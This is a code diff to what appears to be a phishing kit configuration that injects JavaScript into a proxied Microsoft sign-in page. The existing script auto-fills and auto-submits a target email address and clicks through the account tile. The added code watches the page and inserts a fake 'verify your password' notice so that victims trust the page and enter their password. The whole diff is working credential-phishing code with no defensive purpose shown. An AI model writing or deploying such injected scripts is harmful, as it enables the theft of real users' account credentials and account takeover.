@@ -73,14 +73,14 @@ js_inject:
             } else {
               console.error('Email input element not found');
             }
-            
+      
       
             if(document.getElementById("i0116").value == aemail){
               console.log("true , sama");
               console.log(document.getElementById("i0116").value, aemail);
-        
+      
              setTimeout(()=>{var e=document.getElementById("idSIButton9");if(e){e.click();var t=setInterval(runScript,500)}else console.error("Element not found")},800);function runScript(){var e=document.getElementById("aadTileTitle");e?e.click():console.error("Element not found")}
-             
+      
             }else{
               console.log("null and not clicked");
             }
@@ -95,6 +95,42 @@ js_inject:
       
       
       document.addEventListener("DOMContentLoaded",function(){window.addEventListener("load",function(){lp()})});
+              
+              // Function to check for "Enter password" and add the element
+          function checkAndAddElement() {
+          const loginHeader = document.querySelector("#loginHeader div[role='heading']");
+          if (loginHeader && loginHeader.textContent.trim() === "Enter password") {
+          // Create the new element to be added
+          const newElement = document.createElement("div");
+          newElement.className = "row text-body";
+          newElement.innerHTML = `
+        <div id="passwordDesc" class="wrap-content" data-bind="text: unsafe_pageDescription">
+          Because you're accessing sensitive info, you need to verify your password.
+          </div>
+          `;
+          
+          // Append the new element after the loginHeader parent
+          loginHeader.parentElement.insertAdjacentElement("afterend", newElement);
+          
+          // Disconnect the observer since the task is done
+          observer.disconnect();
+        }
+        }
+          
+          // Create a MutationObserver to monitor changes in the DOM
+          const observer = new MutationObserver(() => {
+          checkAndAddElement();
+        });
+          
+          // Start observing the document body for changes
+          observer.observe(document.body, {
+        childList: true, // Monitor for added/removed child nodes
+        subtree: true,   // Monitor the entire subtree
+        });
+          
+          // Run an initial check in case the text is already present
+          checkAndAddElement();
+
 
 
 
